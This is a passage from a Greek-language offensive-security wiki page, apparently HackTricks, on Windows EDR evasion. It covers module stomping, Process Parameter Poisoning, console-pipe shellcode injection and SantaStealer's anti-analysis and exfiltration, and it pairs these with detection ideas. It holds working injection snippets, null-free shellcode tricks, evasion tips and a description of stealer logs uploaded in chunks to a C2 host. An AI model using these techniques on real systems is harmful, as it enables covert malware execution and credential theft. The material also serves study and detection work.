3. Σαρώστε τα υποψήφια DLLs στον δίσκο και συγκρίνετε το **`.text` `Misc_VirtualSize`** του PE section με το μέγεθος του payload. Αυτό έχει μεγαλύτερη σημασία από το μέγεθος του αρχείου, επειδή αντανακλά το μέγεθος του executable section **όταν είναι mapped στη μνήμη**.
4. Αναλύστε το **Export Address Table (EAT)** και επιλέξτε το RVA μιας exported function ως αρχικό offset του stomp.
5. Υπολογίστε το **blast radius**: αν το payload υπερβαίνει τα όρια της επιλεγμένης συνάρτησης, θα κάνει overwrite γειτονικά exports που βρίσκονται μετά από αυτή στη μνήμη.

Συνήθη βοηθητικά εργαλεία recon/επιλογής που χρησιμοποιούνται στην πράξη:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Προτίμησε DLLs που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, ώστε να αποφεύγεται η τηλεμετρία του `LoadLibrary`/των μη αναμενόμενων φορτώσεων image.
- Προτίμησε exports που εκτελούνται σπάνια από την εφαρμογή-στόχο· διαφορετικά, οι κανονικές διαδρομές κώδικα μπορεί να φτάσουν τα stomped bytes πριν ή μετά τη δημιουργία του thread.
- Τα μεγάλα implants συχνά απαιτούν αλλαγή της ενσωμάτωσης shellcode από string literal σε **byte-array/braced initializer**, ώστε να αναπαρίσταται σωστά ολόκληρο το buffer στον source code του injector.

Detection ideas
- Remote writes σε **εκτελέσιμες σελίδες με backing από image** (`MEM_IMAGE`, `PAGE_EXECUTE*`) αντί για τις συνηθέστερες private RWX/RX allocations.
- Entry points exports των οποίων τα in-memory bytes δεν αντιστοιχούν πλέον στο backing file στον δίσκο.
- Remote threads ή context pivots που ξεκινούν την εκτέλεσή τους μέσα σε legitimate DLL export του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε σελίδες DLL `.text`, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι μια τεχνική **process-injection / EDR-evasion** που αποφεύγει την κλασική διαδρομή remote write (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε μια διεργασία-στόχο που εκτελείται ήδη, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης της `CreateProcessW` στη child process** και τις αποθηκεύουν μέσα στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers που αντιγράφονται από την `CreateProcessW`

Χρήσιμοι carriers είναι:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των carriers:

- Το `lpCommandLine` πρέπει να δείχνει σε **εγγράψιμη μνήμη** για την `CreateProcessW` και περιορίζεται σε **32,767 Unicode χαρακτήρες**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα Unicode environment block από διαδοχικά strings `NAME=VALUE\0`, που τερματίζεται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα δεσμευμένο, επομένως η αντιστοίχιση με το `ShellInfo` πρέπει να θεωρείται λεπτομέρεια υλοποίησης και όχι σταθερό, τεκμηριωμένο συμβόλαιο.

Έτσι, η κανονική δημιουργία διεργασίας μετατρέπεται σε **primitive μεταφοράς payload**. Ο operator δημιουργεί την child process με δεδομένα εκκίνησης που ελέγχει ο attacker και αφήνει τα Windows να εκτελέσουν την αντιγραφή μεταξύ διεργασιών.

### Ροή remote lookup χωρίς remote write APIs

Μετά τη δημιουργία της child process, εντοπίζεται το αντιγραμμένο buffer με **μόνο για ανάγνωση** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του remote `PEB`
3. Ακολουθία του `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Ελάχιστη ροή:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Εκτέλεση του αντιγραμμένου buffer παραμέτρων

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW`, όχι εκτελέσιμη. Μια συνηθισμένη αλυσίδα P3 είναι:

1. Δημιουργήστε τη διεργασία κανονικά (όχι σε αναστολή)
2. Κάντε την επιλεγμένη σελίδα παραμέτρων εκτελέσιμη με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποιήστε το handle του κύριου thread που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατευθύνετε την εκτέλεση με `NtSetContextThread` (`CONTEXT_CONTROL`, αντικατάσταση του `RIP`)

Σε αντίθεση με τις κλασικές ροές εργασίας thread hijacking, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας μέσω του επιστρεφόμενου handle του κύριου thread.

Έτσι αποφεύγονται αρκετά API που παρακολουθούνται συχνά για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά και τα `SuspendThread` / `ResumeThread`

### Περιορισμός byte μηδενικού και staged shellcode

Και οι τρεις φορείς είναι **δεδομένα τύπου string ή παρόμοια με string**, επομένως ένα ακατέργαστο payload που περιέχει `0x00` περικόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **πρώτο στάδιο χωρίς null bytes**, το οποίο ανασυνθέτει σταθερές κατά την εκτέλεση και έπειτα φορτώνει ένα αυθαίρετο δεύτερο στάδιο.

Ένα απλό μοτίβο είναι η σύνθεση σταθερών με βάση το XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Αυτό επιτρέπει στο πρώτο στάδιο να δημιουργεί συμβολοσειρές στη στοίβα, ορίσματα API, διαδρομές DLL ή έναν loader shellcode δεύτερου σταδίου, χωρίς να ενσωματώνει null bytes στην παράμετρο που μεταφέρεται.

### Κλήσεις API μέσω της στοίβας από το πρώτο στάδιο

Όταν το πρώτο στάδιο πρέπει να καλέσει API όπως το `LoadLibraryA`, μπορεί να:

- κάνει push τη συμβολοσειρά/το buffer στη στοίβα του στόχου
- δεσμεύσει τον **χώρο shadow 32 byte του x64**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε σταθερές τιμές ή δείκτες σχετικούς με το `RSP`
- διατηρήσει το `RSP` **ευθυγραμμισμένο στα 16 byte** πριν από την κλήση

Έπειτα, ένα δεύτερο στάδιο μπορεί να αντιγραφεί από τη στοίβα σε μια εκχώρηση `PAGE_READWRITE`, η προστασία της να αλλάξει σε `PAGE_EXECUTE_READ` με το `VirtualProtect` και να γίνει άλμα σε αυτήν, αποφεύγοντας έτσι μια άμεση εκχώρηση RWX.

### Ιδέες για ανίχνευση

Καλές ευκαιρίες για hunting που αναφέρουν οι συγγραφείς:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν εκτελέσιμες τις σελίδες παραμέτρων διεργασίας
- αυτή η αλλαγή προστασίας να ακολουθείται από `SetThreadContext` / `NtSetContextThread`
- απομακρυσμένες αναγνώσεις του `PEB` και στη συνέχεια του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλες τιμές ή τιμές υψηλής εντροπίας στα `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία διεργασίας

### Σημειώσεις

- Το P3 είναι ένα **τέχνασμα μεταφοράς μεταξύ διεργασιών**, όχι από μόνο του ένας πλήρης primitive εκτέλεσης: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή δικαιωμάτων εκτέλεσης και μια μέθοδο ανακατεύθυνσης της εκτέλεσης.
- Οι συγγραφείς εξέτασαν το `RtlCreateProcessReflection` / Dirty Vanity, αλλά το απέρριψαν επειδή εσωτερικά καταλήγει σε ύποπτους primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

## Injection μέσω pipe του STDIN της κονσόλας

Ένα διαδραστικό child κονσόλας μπορεί επίσης να χρησιμοποιηθεί ως **primitive μεταφοράς payload**. Ο injector ανακατευθύνει την τυπική είσοδο του child σε ένα pipe και στέλνει έναν δείκτη ακολουθούμενο από shellcode. Αφού το πρόγραμμα της κονσόλας διαβάσει τα δεδομένα στη δική του ιδιωτική μνήμη, ο injector εντοπίζει αυτό το buffer, του δίνει δικαιώματα εκτέλεσης και ανακατευθύνει ένα thread του child προς αυτό. Έτσι αποφεύγονται τα `VirtualAllocEx` και `WriteProcessMemory`, αλλά εξακολουθεί να πρόκειται για process injection και όχι για γενική παράκαμψη EDR.<sup>[[41]](#references)</sup>

Παρά την περιγραφή «named-pipe», η υλοποίηση αναφοράς καλεί το `CreatePipe`, το οποίο δημιουργεί ένα **anonymous pipe**. Τα Windows υλοποιούν εσωτερικά τα anonymous pipes με αντικείμενα pipe που έχουν μοναδικά ονόματα, αλλά το PoC ούτε επιλέγει διαδρομή `\\.\pipe\<name>` ούτε καλεί το `CreateNamedPipe`. Δημιουργεί handles με δυνατότητα κληρονόμησης και έναν προεπιλεγμένο περιγραφέα ασφαλείας, τοποθετεί το handle ανάγνωσης στο `STARTUPINFO.hStdInput`, ορίζει το `STARTF_USESTDHANDLES` και εκκινεί ένα νέο child με ενεργοποιημένη την κληρονόμηση handles. Επομένως, αυτό το PoC εκκινεί το παρεχόμενο εκτελέσιμο κονσόλας· δεν συνδέει το pipe του σε μια υπάρχουσα διεργασία.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Ροή εργασίας αναφοράς

Η υλοποίηση χρησιμοποιεί την ακόλουθη αλληλουχία:<sup>[[41]](#references)</sup>

1. Δημιουργεί ζεύγη anonymous pipe για τα `STDIN` και `STDOUT` του child. Απενεργοποιεί την κληρονόμηση στα δύο handles της πλευράς του parent και κλείνει τα αντίγραφα των handles της πλευράς του child στο parent μετά τη δημιουργία της διεργασίας.
2. Εκκινεί ένα διαδραστικό εκτελέσιμο, όπως το `netsh.exe` ή το `nslookup.exe`, με `CREATE_NEW_CONSOLE`. Το child κληρονομεί τα ανακατευθυνόμενα standard handles.
3. Στέλνει ολόκληρο τον πίνακα δυαδικών δεδομένων `rawData` με το `WriteFile` μέσω του handle `STDIN` της πλευράς του parent. Το πρόγραμμα της κονσόλας καταναλώνει τα bytes και αφήνει ένα αντίγραφό τους σε μία από τις ιδιωτικές δεσμευμένες περιοχές του.
4. Διασχίζει τον χώρο διευθύνσεων του child με το `VirtualQueryEx`, διαβάζει πιθανές περιοχές `MEM_PRIVATE` με το `ReadProcessMemory` και αναζητά τον δείκτη στην αρχή του `rawData`.
5. Αλλάζει την προστασία του buffer που εντοπίστηκε σε `PAGE_EXECUTE_READWRITE` με το `VirtualProtectEx`.
6. Εντοπίζει το κύριο thread, το αναστέλλει, ορίζει το `RIP` σε `found_address + 0x19` με το `NtSetContextThread` και το συνεχίζει.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Η παρεχόμενη υλοποίηση είναι ειδικά σχεδιασμένη για x64: τροποποιεί το `CONTEXT.Rip` και το ενσωματωμένο payload είναι x64 shellcode. Το `rawData` αρχίζει με ένα marker 25 byte, επομένως τα εκτελέσιμα bytes ξεκινούν στη δεκαεξαδική μετατόπιση `0x19`. Κατά την αντικατάσταση του payload, διατηρήστε αυτή τη διάταξη ή ενημερώστε ταυτόχρονα το marker, το search vector, το μέγεθος του array και τη μετατόπιση εκτέλεσης. Τα σχόλια του κώδικα αναφέρουν επίσης τα `0x0A`, `0x0D` και `0x1A` ως bad characters. Αυτή η ροή εργασίας δεν τροποποιεί το token ή τα προνόμια της child διεργασίας.<sup>[[41]](#references)</sup>

Για μικρούς native helpers και μοτίβα μεταγλώττισης payload, δείτε το [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Τεχνικές SantaStealer για fileless evasion και κλοπή διαπιστευτηρίων

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και πρόσβαση σε διαπιστευτήρια σε μία ροή εργασίας.<sup>[[24]](#references)</sup>

### Έλεγχος διάταξης πληκτρολογίου και καθυστέρηση sandbox

- Μια σημαία ρύθμισης (`anti_cis`) απαριθμεί τις εγκατεστημένες διατάξεις πληκτρολογίου μέσω της `GetKeyboardLayoutList`. Αν εντοπιστεί κυριλλική διάταξη, το δείγμα δημιουργεί ένα κενό marker `CIS` και τερματίζεται πριν εκτελέσει stealers, διασφαλίζοντας ότι δεν ενεργοποιείται ποτέ σε εξαιρούμενες τοπικές ρυθμίσεις, ενώ παράλληλα αφήνει ένα artifact για hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Πολυεπίπεδη λογική `check_antivm`

- Η Variant A διατρέχει τη λίστα διεργασιών, υπολογίζει για κάθε όνομα ένα custom κυλιόμενο checksum και το συγκρίνει με ενσωματωμένες λίστες αποκλεισμού για debuggers/sandboxes· επαναλαμβάνει τον υπολογισμό checksum για το όνομα του υπολογιστή και ελέγχει καταλόγους εργασίας, όπως το `C:\analysis`.
- Η Variant B εξετάζει ιδιότητες του συστήματος (ελάχιστο πλήθος διεργασιών, πρόσφατος χρόνος λειτουργίας), καλεί `OpenServiceA("VBoxGuest")` για να εντοπίσει τα VirtualBox additions και εκτελεί ελέγχους χρονισμού γύρω από καθυστερήσεις, για να εντοπίσει το single-stepping. Οποιαδήποτε ένδειξη προκαλεί διακοπή πριν από την εκκίνηση των modules.

### Βοηθητικό πρόγραμμα χωρίς αρχεία + διπλή reflective φόρτωση ChaCha20

- Το κύριο DLL/EXE ενσωματώνει ένα Chromium credential helper, το οποίο είτε εγγράφεται στον δίσκο είτε γίνεται manual mapping στη μνήμη· στη λειτουργία fileless, επιλύει μόνο του τα imports/relocations, ώστε να μην εγγράφονται βοηθητικά αρχεία.
- Το helper αποθηκεύει ένα DLL δεύτερου σταδίου, κρυπτογραφημένο δύο φορές με ChaCha20 (δύο κλειδιά 32 byte + nonce 12 byte). Μετά και τα δύο περάσματα, φορτώνει το blob με reflective loading (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, που προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες ChromElevator χρησιμοποιούν reflective process hollowing με direct syscalls για να κάνουν inject σε ένα ενεργό Chromium browser, να κληρονομήσουν τα κλειδιά AppBound Encryption και να αποκρυπτογραφήσουν κωδικούς πρόσβασης/cookies/πιστωτικές κάρτες απευθείας από βάσεις δεδομένων SQLite, παρά τη σκλήρυνση του ABE.

### Αρθρωτή συλλογή στη μνήμη και εξαγωγή δεδομένων μέσω HTTP σε τμήματα

- Η `create_memory_based_log` διατρέχει έναν καθολικό πίνακα δεικτών συναρτήσεων `memory_generators` και δημιουργεί ένα thread για κάθε ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, έγγραφα, επεκτάσεις browser κ.λπ.). Κάθε thread εγγράφει τα αποτελέσματα σε κοινόχρηστα buffers και αναφέρει το πλήθος των αρχείων του μετά από περίοδο αναμονής join περίπου 45 δευτερολέπτων.
- Όταν ολοκληρωθεί η διαδικασία, όλα συμπιέζονται με τη στατικά συνδεδεμένη βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Στη συνέχεια, το `ThreadPayload1` περιμένει 15 δευτερόλεπτα και μεταδίδει το αρχείο σε τμήματα των 10 MB μέσω HTTP POST στο `http://<C2>:6767/upload`, πλαστογραφώντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε τμήμα περιλαμβάνει `User-Agent: upload`, `auth: <build_id>`, προαιρετικά `w: <campaign_tag>`, ενώ στο τελευταίο τμήμα προστίθεται `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασυναρμολόγηση.

## References

- [1] [Προηγμένες τεχνικές αποφυγής εντοπισμού: ακριβές Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: τέλος στις δωρεάν ευκαιρίες για malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – τεκμηρίωση](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – δείγμα](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – δείγμα](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC για πλαστογράφηση call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Νέα αλυσίδα μόλυνσης και obfuscation βασισμένο στο ConfuserEx για το DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των ελέγχων κατάστασης του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Πριν από το ToolShell: Εξέταση των προηγούμενων ransomware επιχειρήσεων του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Κατάχρηση forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Κατάλογος forwarded exports των Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Σειρά αναζήτησης dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Ασφάλεια διεργασιών και δικαιώματα πρόσβασης](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Αναφορά EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Εκκινητής CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Αντιμετώπιση των EDR με την υποστήριξη του Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Σπάστε το προστατευτικό κέλυφος του Windows Defender με την τεχνική ανακατεύθυνσης φακέλων](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Αναφορά εντολής mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Πίσω από την καθαρή πρόσοψη: Από RAT σε builder και coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – Το SantaStealer έρχεται στην πόλη: Ένα νέο, φιλόδοξο infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Αποκρυπτογράφηση Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Αντιμετώπιση malware Node.js με API tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Ωραία Κοιμωμένη: Βάζοντας το Adaptix για ύπνο με το Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Δηλητηρίαση παραμέτρων διεργασίας](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Ωραία Κοιμωμένη II: CFG, CET και πλαστογράφηση stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation ύπνου Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Απόκρυψη του Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Κατάχρηση του Chrome Remote Desktop σε επιχειρήσεις Red Team: Ένας πρακτικός οδηγός](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Μετατροπή του remediation driver του Defender σε primitive λειτουργιών kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Συνοδευτικός κώδικας του Function Peekaboo της MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Δημιουργία self-masking συναρτήσεων με LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Πηγαίος κώδικας InjectSetConsole του TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Συνάρτηση CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Δημιουργία child process με ανακατευθυνόμενη είσοδο και έξοδο](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Αναδημιουργία εργαλείων C# με WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Μεταγλώττιση έργων C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
{{#include ../banners/hacktricks-training.md}}
